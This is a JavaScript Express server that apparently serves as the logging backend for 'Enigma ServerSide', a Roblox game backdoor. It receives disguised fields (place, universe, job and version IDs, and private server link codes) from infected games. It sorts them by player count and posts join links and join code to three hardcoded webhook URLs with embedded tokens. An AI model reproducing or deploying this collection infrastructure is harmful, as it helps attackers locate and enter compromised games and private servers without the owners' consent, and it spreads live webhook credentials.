var express = require("express");
var axios = require("axios");
var bparse = require("body-parser");

var app = express();
app.use(bparse.json())
var poor = "https://webhook.newstargeted.com/api/webhooks/1292555511212015798/UJVW_q6q8yap15yZ6bMMNG4OmdYjRZTXPvpqQD-HWTNan6w2KP0QJ8FdcYOaJL3I7ajK";
var good = "https://webhook.newstargeted.com/api/webhooks/1292555611178930276/5FRUvRXRhPYh2m2vUAMhVDA9bhQYIX2GFueLN1awFf9-_dQOGgJYVnnfHJtUVmR2enrd";
var nice = "https://webhook.newstargeted.com/api/webhooks/1293984385741361213/zKFC3xnhsQj-tSUPtUx1DT5oxdjCwvd2HuP64WeUFcimUE2M8HHxoQX7e7gjWWrfJjdA";

app.get("/", async(req,res) => {
  res.send("sigma")
})

app.post("/api/v1/logs", async (req, res) => {
  var { burgers, fries, soda, order, donut,type } = req.body;
  console.log(`${burgers} \n ${fries} ${soda} \n ${type}`);
  // burgers: placeid, fries: universe, soda: job, order: current players, donut: place version, type: literally type

  var activity = await axios.get(
    `https://games.roproxy.com/v1/games?universeIds=${fries}`,
  );

  activity = activity.data.data[0];
  var picture = await axios.get(
    `https://thumbnails.roproxy.com/v1/games/icons?universeIds=${fries}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false`,
  );
  picture = picture.data.data[0];
  var votes = await axios.get(`https://roproxify.vercel.app/api/v1/log/votes/${fries}`);
  votes = votes.data.data[0];
  var enlightened = await axios.get(`https://roproxify.vercel.app/api/v1/log/multi/${burgers}`);
  enlightened = enlightened.data[0];
  function ScanAsync() {
    if (activity.creator.type === "Group") {
      return `[${activity.creator.name}](https://roblox.com/groups/${activity.creator.id})`;
    } else {
      return `[${activity.creator.name}](https://roblox.com/users/${activity.creator.id})`;
    }
  }
  if (type !== "Private") {
    if (activity.playing >= 100) {
      const embed = {
        title: "**Enigma ServerSide**",
        description: "",
        author: {
          name: "Enigma Utilities",
        },
        footer: {
          text: "Enigma SS | Logged Game",
        },
        thumbnail: {
          url: picture.imageUrl,
        },
        fields: [
          {
            name: "**Game Information**",
            value: `> **Game Name**: ${activity.name} \n > **Universe ID**: ${fries} \n > **Game Link**: [${activity.name}](https://roblox.com/games/${burgers}) \n > **Visit Link**: [${activity.name}](https://www.roblox.com/games/start?launchData=${soda}&placeId=${burgers}) \n > **Active Players**: ${activity.playing} \n > **Server Players**: ${order}/${activity.maxPlayers} \n > **Visits**: ${activity.visits} \n > **Universe Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${donut} \n > **Upvotes**: ${votes.upVotes} \n > **Downvotes**: ${votes.downVotes}`,
            inline: false,
          },
          {
            name: "**Creator Information**",
            value: `> **Creator Name**: ${activity.creator.name} \n > **Creator ID**: ${activity.creator.id} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Link**: ${ScanAsync()} \n > **Game Playable**: ${String(enlightened.isPlayabe)} \n > **Prohibited Reason**: ${enlightened.reasonProhibited}`,
            inline: false,
          },
          {
            name: "**Javascript Join Code**:",
            value:
              "```js\nRoblox.GameLauncher.joinGameInstance(" +
              burgers +
              ',"' +
              soda +
              '")```',
            inline: false,
          },
        ],
        timestamp: new Date(),
      };

      axios.post(good, {
        embeds: [embed],
      });
      } else {
        const embed = {
        title: "**Enigma ServerSide**",
        description: "",
        author: {
          name: "Enigma Utilities",
        },
        footer: {
          text: "Enigma SS | Logged Game",
        },
        thumbnail: {
          url: picture.imageUrl,
        },
        fields: [
          {
            name: "**Game Information**",
            value: `> **Game Name**: ${activity.name} \n > **Universe ID**: ${fries} \n > **Game Link**: [${activity.name}](https://roblox.com/games/${burgers}) \n > **Visit Link**: [${activity.name}](https://www.roblox.com/games/start?launchData=${soda}&placeId=${burgers}) \n > **Active Players**: ${activity.playing} \n > **Server Players**: ${order}/${activity.maxPlayers} \n > **Visits**: ${activity.visits} \n > **Universe Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${donut} \n > **Upvotes**: ${votes.upVotes} \n > **Downvotes**: ${votes.downVotes}`,
            inline: false,
          },
          {
            name: "**Creator Information**",
            value: `> **Creator Name**: ${activity.creator.name} \n > **Creator ID**: ${activity.creator.id} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Link**: ${ScanAsync()} \n > **Game Playable**: ${String(enlightened.isPlayabe)} \n > **Prohibited Reason**: ${enlightened.reasonProhibited}`,
            inline: false,
          },
          {
            name: "**Javascript Join Code**:",
            value:
              "```js\nRoblox.GameLauncher.joinGameInstance(" +
              burgers +
              ',"' +
              soda +
              '")```',
            inline: false,
          },
        ],
        timestamp: new Date(),
      };

      axios.post(poor, {
        embeds: [embed],
      });
      } 
  } else if (type === "Private") {
    if (activity.playing >= 100) {
      const embed = {
        title: "**Enigma ServerSide**",
        description: "",
        author: {
          name: "Enigma Utilities",
        },
        footer: {
          text: "Enigma SS | Logged Game",
        },
        thumbnail: {
          url: picture.imageUrl,
        },
        fields: [
          {
            name: "**Game Information**",
            value: `> **Game Name**: ${activity.name} \n > **Universe ID**: ${fries} \n > **Game Link**: [${activity.name}](https://roblox.com/games/${burgers}) \n > **Visit Link**: [${activity.name}](https://www.roblox.com/games/start?placeId=${burgers}&privateServerLinkCode=${soda}) \n > **Active Players**: ${activity.playing} \n > **Server Players**: ${order}/${activity.maxPlayers} \n > **Visits**: ${activity.visits} \n > **Universe Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${donut} \n > **Upvotes**: ${votes.upVotes} \n > **Downvotes**: ${votes.downVotes}`,
            inline: false,
          },
          {
            name: "**Creator Information**",
            value: `> **Creator Name**: ${activity.creator.name} \n > **Creator ID**: ${activity.creator.id} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Link**: ${ScanAsync()} \n > **Game Playable**: ${String(enlightened.isPlayabe)} \n > **Prohibited Reason**: ${enlightened.reasonProhibited}`,
            inline: false,
          },
          {
            name: "**Javascript Join Code**:",
            value:
              "```js\nRoblox.GameLauncher.joinGameInstance(" +
              burgers +
              ',"' +
              soda +
              '")```',
            inline: false,
          },
        ],
        timestamp: new Date(),
      };

      axios.post(good, {
        embeds: [embed],
      });
    } else if (type === "Private") {
        if (activity.playing >= 1000) {
            const embed = {
                title: "**Enigma ServerSide**",
                description: "",
                author: {
                    name: "Enigma Utilities",
                },
                footer: {
                    text: "Enigma SS | Logged Game",
                },
                thumbnail: {
                    url: picture.imageUrl,
                },
                fields: [
                    {
                        name: "**Game Information**",
                        value: `> **Game Name**: ${activity.name} \n > **Universe ID**: ${fries} \n > **Game Link**: [${activity.name}](https://roblox.com/games/${burgers}) \n > **Visit Link**: [${activity.name}](https://www.roblox.com/games/start?placeId=${burgers}&privateServerLinkCode=${soda}) \n > **Active Players**: ${activity.playing} \n > **Server Players**: ${order}/${activity.maxPlayers} \n > **Visits**: ${activity.visits} \n > **Universe Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${donut} \n > **Upvotes**: ${votes.upVotes} \n > **Downvotes**: ${votes.downVotes}`,
                        inline: false,
                    },
                    {
                        name: "**Creator Information**",
                        value: `> **Creator Name**: ${activity.creator.name} \n > **Creator ID**: ${activity.creator.id} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Link**: ${ScanAsync()} \n > **Game Playable**: ${String(enlightened.isPlayabe)} \n > **Prohibited Reason**: ${enlightened.reasonProhibited}`,
                        inline: false,
                    },
                    {
                        name: "**Javascript Join Code**:",
                        value:
                            "```js\nRoblox.GameLauncher.joinGameInstance(" +
                            burgers +
                            ',"' +
                            soda +
                            '")```',
                        inline: false,
                    },
                ],
                timestamp: new Date(),
            };

            axios.post(nice, {
                embeds: [embed],
            });
      } else {
        const embed = {
        title: "**Enigma ServerSide**",
        description: "",
        author: {
          name: "Enigma Utilities",
        },
        footer: {
          text: "Enigma SS | Logged Game",
        },
        thumbnail: {
          url: picture.imageUrl,
        },
        fields: [
          {
            name: "**Game Information**",
            value: `> **Game Name**: ${activity.name} \n > **Universe ID**: ${fries} \n > **Game Link**: [${activity.name}](https://roblox.com/games/${burgers}) \n > **Visit Link**: [${activity.name}](https://www.roblox.com/games/start?placeId=${burgers}&privateServerLinkCode=${soda}) \n > **Active Players**: ${activity.playing} \n > **Server Players**: ${order}/${activity.maxPlayers} \n > **Visits**: ${activity.visits} \n > **Universe Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${donut} \n > **Upvotes**: ${votes.upVotes} \n > **Downvotes**: ${votes.downVotes}`,
            inline: false,
          },
          {
            name: "**Creator Information**",
            value: `> **Creator Name**: ${activity.creator.name} \n > **Creator ID**: ${activity.creator.id} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Link**: ${ScanAsync()} \n > **Game Playable**: ${String(enlightened.isPlayabe)} \n > **Prohibited Reason**: ${enlightened.reasonProhibited}`,
            inline: false,
          },
          {
            name: "**Javascript Join Code**:",
            value:
              "```js\nRoblox.GameLauncher.joinGameInstance(" +
              burgers +
              ',"' +
              soda +
              '")```',
            inline: false,
          },
        ],
        timestamp: new Date(),
      };

      axios.post(poor, {
        embeds: [embed],
      });
      } 
  }

  res.json([]);
  }
});

app.listen(3000, () => {
  console.log("yikes")
})